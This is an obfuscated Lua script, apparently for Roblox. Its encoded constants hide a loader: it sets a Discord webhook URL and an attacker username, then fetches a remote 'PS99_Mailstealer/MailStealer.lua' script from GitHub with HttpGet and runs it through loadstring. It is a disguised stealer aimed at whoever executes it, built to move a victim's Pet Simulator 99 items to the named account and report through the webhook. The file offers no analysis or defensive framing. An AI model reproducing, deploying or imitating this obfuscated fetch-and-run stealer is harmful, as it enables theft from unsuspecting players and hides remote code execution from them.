--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			local v81 = 0;
			while true do
				if (v81 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v82 = 0;
			local v83;
			while true do
				if (v82 == 0) then
					v83 = v2(v0(v30, 16));
					if v19 then
						local v109 = v5(v83, v19);
						v19 = nil;
						return v109;
					else
						return v83;
					end
					break;
				end
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v84 = 0 - 0;
			local v85;
			while true do
				if (v84 == 0) then
					v85 = (v31 / (((1070 - (68 + 997)) - 3) ^ (v32 - 1))) % (((1273 - (226 + 1044)) - (4 - 3)) ^ (((v33 - (2 - 1)) - (v32 - (620 - (555 + 64)))) + (932 - (857 + 74))));
					return v85 - (v85 % (569 - (367 + 201)));
				end
			end
		else
			local v86 = 927 - ((331 - (32 + 85)) + 713);
			local v87;
			while true do
				if (v86 == (0 + 0)) then
					v87 = (1 + 1) ^ (v32 - ((790 + 88) - (282 + 595)));
					return (((v31 % (v87 + v87)) >= v87) and (1638 - ((2170 - 647) + 114))) or 0;
				end
			end
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35, v36 = v1(v16, v18, v18 + 2 + 0);
		v18 = v18 + 1 + 1;
		return (v36 * (1213 - (892 + 65))) + v35;
	end
	local function v23()
		local v37 = 350 - (87 + 263);
		local v38;
		local v39;
		local v40;
		local v41;
		while true do
			if ((181 - ((266 - 199) + 113)) == v37) then
				return (v41 * ((40023515 - (802 + 150)) - 23245347)) + (v40 * (121138 - (149699 - 94097))) + (v39 * 256) + v38;
			end
			if (v37 == 0) then
				v38, v39, v40, v41 = v1(v16, v18, v18 + (4 - 1));
				v18 = v18 + 3 + 1;
				v37 = 1;
			end
		end
	end
	local function v24()
		local v42 = (0 - 0) - 0;
		local v43;
		local v44;
		local v45;
		local v46;
		local v47;
		local v48;
		while true do
			if (v42 == (2 + 0 + 0)) then
				v47 = v20(v44, 1018 - (915 + 82), 87 - 56);
				v48 = ((v20(v44, 19 + (47 - 34)) == (1 - 0)) and -(1188 - (1069 + 118))) or (2 - 1);
				v42 = 6 - 3;
			end
			if (v42 == 1) then
				v45 = (3 - 2) + 0;
				v46 = (v20(v44, 1 - 0, 20) * ((2 + 0) ^ (823 - ((1227 - (814 + 45)) + 423)))) + v43;
				v42 = 6 - 4;
			end
			if (v42 == (21 - (10 + 8))) then
				if (v47 == (0 - 0)) then
					if (v46 == (442 - ((1024 - 608) + 26))) then
						return v48 * 0;
					else
						v47 = (1 + 2) - 2;
						v45 = 0 + 0;
					end
				elseif (v47 == 2047) then
					return ((v46 == (0 - 0)) and (v48 * ((439 - (145 + 104 + 189)) / (430 - (44 + 386))))) or (v48 * NaN);
				end
				return v8(v48, v47 - (2509 - (998 + 488))) * (v45 + (v46 / ((1 + (886 - (261 + 624))) ^ (43 + 9))));
			end
			if (v42 == (772 - (201 + 571))) then
				v43 = v23();
				v44 = v23();
				v42 = 1139 - ((206 - 90) + 1022);
			end
		end
	end
	local function v25(v49)
		local v50;
		if not v49 then
			v49 = v23();
			if (v49 == (1080 - (1020 + 60))) then
				return "";
			end
		end
		v50 = v3(v16, v18, (v18 + v49) - (1424 - (630 + 793)));
		v18 = v18 + v49;
		local v51 = {};
		for v65 = 3 - 2, #v50 do
			v51[v65] = v2(v1(v3(v50, v65, v65)));
		end
		return v6(v51);
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v52 = (function()
			return 0 - 0;
		end)();
		local v53 = (function()
			return;
		end)();
		local v54 = (function()
			return;
		end)();
		local v55 = (function()
			return;
		end)();
		local v56 = (function()
			return;
		end)();
		local v57 = (function()
			return;
		end)();
		local v58 = (function()
			return;
		end)();
		while true do
			if (v52 ~= #"}") then
			else
				local v90 = (function()
					return 1500 - (1408 + 92);
				end)();
				local v91 = (function()
					return;
				end)();
				while true do
					if (v90 ~= (1086 - (461 + 625))) then
					else
						v91 = (function()
							return 1288 - (993 + 295);
						end)();
						while true do
							if (v91 == 1) then
								for v113 = #"}", v57 do
									local v114 = (function()
										return 0 + 0;
									end)();
									local v115 = (function()
										return;
									end)();
									local v116 = (function()
										return;
									end)();
									local v117 = (function()
										return;
									end)();
									while true do
										if (v114 == (241 - (187 + 54))) then
											local v124 = (function()
												return 780 - (162 + 618);
											end)();
											local v125 = (function()
												return;
											end)();
											while true do
												if (v124 ~= 0) then
												else
													v125 = (function()
														return 0;
													end)();
													while true do
														if (v125 ~= (1 + 0)) then
														else
															v114 = (function()
																return 1;
															end)();
															break;
														end
														if ((0 + 0) == v125) then
															v115 = (function()
																return 0 + 0;
															end)();
															v116 = (function()
																return nil;
															end)();
															v125 = (function()
																return 1;
															end)();
														end
													end
													break;
												end
											end
										end
										if (v114 == (1 - 0)) then
											v117 = (function()
												return nil;
											end)();
											while true do
												if (v115 == (0 - 0)) then
													local v171 = (function()
														return 0 + 0;
													end)();
													local v172 = (function()
														return;
													end)();
													while true do
														if (v171 ~= 0) then
														else
															v172 = (function()
																return 0;
															end)();
															while true do
																if (1 ~= v172) then
																else
																	v115 = (function()
																		return #"{";
																	end)();
																	break;
																end
																if ((1636 - (1373 + 263)) ~= v172) then
																else
																	v116 = (function()
																		return v21();
																	end)();
																	v117 = (function()
																		return nil;
																	end)();
																	v172 = (function()
																		return 1770 - (1749 + 20);
																	end)();
																end
															end
															break;
														end
													end
												end
												if (v115 ~= #"}") then
												else
													if (v116 == #",") then
														v117 = (function()
															return v21() ~= 0;
														end)();
													elseif (v116 == 2) then
														v117 = (function()
															return v24();
														end)();
													elseif (v116 ~= #"xnx") then
													else
														v117 = (function()
															return v25();
														end)();
													end
													v58[v113] = (function()
														return v117;
													end)();
													break;
												end
											end
											break;
										end
									end
								end
								v56[#"19("] = (function()
									return v21();
								end)();
								v91 = (function()
									return 1002 - (451 + 549);
								end)();
							end
							if (v91 == 0) then
								v57 = (function()
									return v23();
								end)();
								v58 = (function()
									return {};
								end)();
								v91 = (function()
									return 1 + 0;
								end)();
							end
							if (v91 ~= (2 - 0)) then
							else
								v52 = (function()
									return 1324 - (1249 + 73);
								end)();
								break;
							end
						end
						break;
					end
				end
			end
			if ((1 + 1) == v52) then
				for v94 = #"]", v23() do
					local v95 = (function()
						return v21();
					end)();
					if (v20(v95, #",", #">") == (1145 - (466 + 679))) then
						local v104 = (function()
							return 0;
						end)();
						local v105 = (function()
							return;
						end)();
						local v106 = (function()
							return;
						end)();
						local v107 = (function()
							return;
						end)();
						local v108 = (function()
							return;
						end)();
						while true do
							if (v104 ~= (2 - 0)) then
							else
								while true do
									if (v105 == #"nil") then
										if (v20(v107, #"19(", #"xxx") == #"!") then
											v108[#"0313"] = (function()
												return v58[v108[#"0313"]];
											end)();
										end
										v53[v94] = (function()
											return v108;
										end)();
										break;
									end
									if (v105 == (5 - 3)) then
										local v119 = (function()
											return 1384 - (746 + 638);
										end)();
										local v120 = (function()
											return;
										end)();
										while true do
											if (v119 ~= 0) then
											else
												v120 = (function()
													return 0 + 0;
												end)();
												while true do
													if (v120 == (0 - 0)) then
														if (v20(v107, #":", #" ") == #"|") then
															v108[5 - 3] = (function()
																return v58[v108[2]];
															end)();
														end
														if (v20(v107, 5 - 3, 116 - (4 + 110)) ~= #",") then
														else
															v108[#"91("] = (function()
																return v58[v108[#"-19"]];
															end)();
														end
														v120 = (function()
															return 1;
														end)();
													end
													if (v120 ~= (585 - (57 + 527))) then
													else
														v105 = (function()
															return #"91(";
														end)();
														break;
													end
												end
												break;
											end
										end
									end
									if (v105 ~= (1427 - (41 + 1386))) then
									else
										local v121 = (function()
											return 341 - (218 + 123);
										end)();
										while true do
											if (v121 == (1582 - (1535 + 46))) then
												v105 = (function()
													return #"]";
												end)();
												break;
											end
											if ((0 + 0) ~= v121) then
											else
												v106 = (function()
													return v20(v95, 2, #"xnx");
												end)();
												v107 = (function()
													return v20(v95, #"?id=", 1 + 5);
												end)();
												v121 = (function()
													return 1;
												end)();
											end
										end
									end
									if (v105 == #"}") then
										local v122 = (function()
											return 0 + 0;
										end)();
										local v123 = (function()
											return;
										end)();
										while true do
											if (v122 ~= 0) then
											else
												v123 = (function()
													return 0 - 0;
												end)();
												while true do
													if (v123 == (560 - (306 + 254))) then
														v108 = (function()
															return {v22(),v22(),nil,nil};
														end)();
														if (v106 == (0 - 0)) then
															local v187 = (function()
																return 0;
															end)();
															local v188 = (function()
																return;
															end)();
															while true do
																if ((1467 - (899 + 568)) == v187) then
																	v188 = (function()
																		return 0 + 0;
																	end)();
																	while true do
																		if (v188 == (0 + 0)) then
																			v108[#"-19"] = (function()
																				return v22();
																			end)();
																			v108[#"?id="] = (function()
																				return v22();
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														elseif (v106 == #"!") then
															v108[#"nil"] = (function()
																return v23();
															end)();
														elseif (v106 == (4 - 2)) then
															v108[#"xnx"] = (function()
																return v23() - ((1 + 1) ^ (619 - (268 + 335)));
															end)();
														elseif (v106 == #"nil") then
															local v193 = (function()
																return 290 - (60 + 230);
															end)();
															local v194 = (function()
																return;
															end)();
															while true do
																if (v193 ~= (0 - 0)) then
																else
																	v194 = (function()
																		return 0;
																	end)();
																	while true do
																		if (v194 ~= (65 - (30 + 35))) then
																		else
																			v108[#"19("] = (function()
																				return v23() - ((2 + 0) ^ 16);
																			end)();
																			v108[#"asd1"] = (function()
																				return v22();
																			end)();
																			break;
																		end
																	end
																	break;
																end
															end
														end
														v123 = (function()
															return 573 - (426 + 146);
														end)();
													end
													if ((1 + 0) ~= v123) then
													else
														v105 = (function()
															return 1214 - (323 + 889);
														end)();
														break;
													end
												end
												break;
											end
										end
									end
								end
								break;
							end
							if (v104 ~= (1456 - (282 + 1174))) then
							else
								local v111 = (function()
									return 811 - (569 + 242);
								end)();
								while true do
									if ((2 - 1) ~= v111) then
									else
										v104 = (function()
											return 1;
										end)();
										break;
									end
									if (v111 ~= 0) then
									else
										v105 = (function()
											return 0 - 0;
										end)();
										v106 = (function()
											return nil;
										end)();
										v111 = (function()
											return 1;
										end)();
									end
								end
							end
							if (v104 ~= (1 + 0)) then
							else
								local v112 = (function()
									return 1024 - (706 + 318);
								end)();
								while true do
									if (v112 == (321 - (53 + 267))) then
										v104 = (function()
											return 1253 - (721 + 530);
										end)();
										break;
									end
									if (v112 == (0 + 0)) then
										v107 = (function()
											return nil;
										end)();
										v108 = (function()
											return nil;
										end)();
										v112 = (function()
											return 414 - (15 + 398);
										end)();
									end
								end
							end
						end
					end
				end
				for v96 = #"{", v23() do
					v54[v96 - #"{"] = (function()
						return v28();
					end)();
				end
				return v56;
			end
			if (v52 == (982 - (18 + 964))) then
				local v92 = (function()
					return 0 - 0;
				end)();
				local v93 = (function()
					return;
				end)();
				while true do
					if (v92 == (0 + 0)) then
						v93 = (function()
							return 1271 - (945 + 326);
						end)();
						while true do
							if (v93 ~= (4 - 2)) then
							else
								v52 = (function()
									return #">";
								end)();
								break;
							end
							if (0 ~= v93) then
							else
								v53 = (function()
									return {};
								end)();
								v54 = (function()
									return {};
								end)();
								v93 = (function()
									return 1 + 0;
								end)();
							end
							if (v93 ~= 1) then
							else
								v55 = (function()
									return {};
								end)();
								v56 = (function()
									return {v53,v54,nil,v55};
								end)();
								v93 = (function()
									return 2;
								end)();
							end
						end
						break;
					end
				end
			end
		end
	end
	local function v29(v59, v60, v61)
		local v62 = v59[(106 + 21) - (116 + 10)];
		local v63 = v59[1 + 1];
		local v64 = v59[741 - (542 + 196)];
		return function(...)
			local v67 = v62;
			local v68 = v63;
			local v69 = v64;
			local v70 = v27;
			local v71 = 1;
			local v72 = -(1 - (0 - 0));
			local v73 = {};
			local v74 = {...};
			local v75 = v12("#", ...) - (1 + 0);
			local v76 = {};
			local v77 = {};
			for v88 = 0, v75 do
				if (v88 >= v69) then
					v73[v88 - v69] = v74[v88 + 1 + 0 + 0];
				else
					v77[v88] = v74[v88 + (2 - 1)];
				end
			end
			local v78 = (v75 - v69) + (2 - 1);
			local v79;
			local v80;
			while true do
				local v89 = 0;
				while true do
					if ((v89 == (1551 - (1126 + 425))) or (2396 > 2904)) then
						v79 = v67[v71];
						v80 = v79[(1441 - 1035) - ((403 - 285) + 287)];
						v89 = 1;
					end
					if ((v89 == 1) or (3315 <= 2782)) then
						if (v80 <= (43 - 32)) then
							if (v80 <= ((2471 - 1345) - (118 + 1003))) then
								if (v80 <= (5 - 3)) then
									if ((v80 <= (377 - ((1160 - (697 + 321)) + (565 - 330)))) or (876 >= 2964)) then
										local v126 = v79[9 - 7];
										local v127, v128 = v70(v77[v126](v13(v77, v126 + 1 + 0, v79[980 - (553 + 37 + 387)])));
										v72 = (v128 + v126) - (1 - 0);
										local v129 = 0 + 0;
										for v140 = v126, v72 do
											local v141 = 0 - 0;
											while true do
												if (v141 == (0 + 0)) then
													v129 = v129 + (1 - 0) + 0;
													v77[v140] = v127[v129];
													break;
												end
											end
										end
									elseif (v80 == ((1691 - (1121 + 569)) + 0)) then
										v71 = v79[2 + 1];
									else
										for v174 = v79[4 - (216 - (22 + 192))], v79[7 - 4] do
											v77[v174] = nil;
										end
									end
								elseif (v80 <= (6 - 3)) then
									local v130 = v79[4 - 2];
									local v131, v132 = v70(v77[v130](v13(v77, v130 + 1 + 0, v79[14 - 11])));
									v72 = (v132 + v130) - (754 - (239 + 201 + 313));
									local v133 = (0 - 0) + 0;
									for v142 = v130, v72 do
										v133 = v133 + (1330 - (797 + (1426 - 894)));
										v77[v142] = v131[v133];
									end
								elseif (v80 > (3 + 1)) then
									v77[v79[2]] = v79[2 + 1];
								else
									local v148 = v79[4 - 2];
									local v149 = v77[v79[1205 - (373 + 829)]];
									v77[v148 + 1] = v149;
									v77[v148] = v149[v79[(1962 - (322 + 905)) - ((1087 - (602 + 9)) + 255)]];
								end
							elseif (v80 <= ((2327 - (449 + 740)) - ((1832 - (1404 + 59)) + (2082 - 1321)))) then
								if ((v80 <= (4 + 2)) or (2232 > 2497)) then
									v61[v79[3]] = v77[v79[2 - 0]];
								elseif (v80 > (13 - 6)) then
									if ((v77[v79[2]] == v79[4]) or (2110 <= 332)) then
										v71 = v71 + 1;
									else
										v71 = v79[(323 - 82) - (64 + 174)];
									end
								else
									for v176 = v79[1 + (766 - (468 + 297))], v79[(565 - (334 + 228)) - 0] do
										v77[v176] = nil;
									end
								end
							elseif (v80 <= (345 - ((1016 - (826 + 46)) + 192))) then
								v77[v79[218 - ((989 - (245 + 702)) + 174)]]();
							elseif ((3686 > 3172) and (v80 == 10)) then
								v77[v79[2 + 0]] = v61[v79[(9 - 6) + 0]];
							else
								v77[v79[1 + 1]] = v61[v79[1507 - (363 + 1141)]];
							end
						elseif ((v80 <= (1597 - (1183 + 397))) or (4474 < 820)) then
							if (v80 <= (42 - 28)) then
								if (v80 <= ((30 - 21) + 1 + 2)) then
									if ((4279 >= 2882) and (v77[v79[2]] == v79[3 + 1])) then
										v71 = v71 + (1976 - (1913 + 62));
									else
										v71 = v79[2 + 1];
									end
								elseif (v80 == ((78 - 44) - 21)) then
									v77[v79[1935 - (565 + (3266 - (260 + 1638)))]] = v79[3] ~= (0 - (0 - 0));
								else
									do
										return;
									end
								end
							elseif (v80 <= (1676 - (420 + 1057 + 184))) then
								v77[v79[(442 - (382 + 58)) - 0]] = v79[3] ~= (0 + 0);
							elseif (v80 == (872 - (564 + 292))) then
								v77[v79[2 - (236 - (141 + 95))]] = v79[3];
							else
								v71 = v79[8 - 5];
							end
						elseif (v80 <= ((319 + 5) - (244 + 60))) then
							if (v80 <= (14 + 4)) then
								local v137 = 0;
								local v138;
								while true do
									if ((476 - (41 + 435)) == v137) then
										v138 = v79[1003 - (938 + 63)];
										v77[v138] = v77[v138](v13(v77, v138 + (2 - 1) + 0, v72));
										break;
									end
								end
							elseif (v80 > (1144 - (936 + 189))) then
								v77[v79[1 + 1]]();
							else
								v61[v79[(5184 - 3568) - (1565 + 48)]] = v77[v79[2 + 0]];
							end
						elseif (v80 <= (1159 - (782 + 356))) then
							do
								return;
							end
						elseif ((v80 > (289 - (176 + 91))) or (2029 >= 3521)) then
							local v164 = v79[4 - 2];
							local v165 = v77[v79[3]];
							v77[v164 + (2 - 1)] = v165;
							v77[v164] = v165[v79[(2 + 3) - 1]];
						else
							local v169 = 1092 - (975 + (320 - 203));
							local v170;
							while true do
								if (v169 == 0) then
									v170 = v79[2];
									v77[v170] = v77[v170](v13(v77, v170 + 1, v72));
									break;
								end
							end
						end
						v71 = v71 + (1876 - (157 + 1718));
						break;
					end
				end
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!0B3Q00028Q00026Q00F03F03073Q00576562682Q6F6B03793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F313331393837312Q34383935363739363938392F38487445714968664936524C67763361684C7658437738777A6D772Q325046356274474B334C673172526E2Q6A716566632Q5668694B542D6E774E6341786A3067376633030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034D3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F4B692Q75502F50532Q395F4D61696C737465616C65722F6D61696E2F4D61696C537465616C65722E6C756103083Q00557365726E616D6503093Q0070726F6A7865632Q74030A3Q004C6F61645363722Q656E00243Q0012053Q00014Q0002000100013Q00260C3Q0002000100010004113Q00020001001205000100013Q00260C00010011000100020004113Q00110001001205000200043Q001213000200033Q00120A000200053Q00120A000300063Q002017000300030007001205000500086Q000300054Q001600023Q00022Q00090002000100010004113Q0023000100260C00010005000100010004113Q00050001001205000200013Q00260C0002001B000100010004113Q001B00010012050003000A3Q001213000300094Q000F000300013Q0012130003000B3Q001205000200023Q00260C00020014000100020004113Q00140001001205000100023Q0004113Q000500010004113Q001400010004113Q000500010004113Q002300010004113Q000200012Q000E3Q00017Q00", v9(), ...);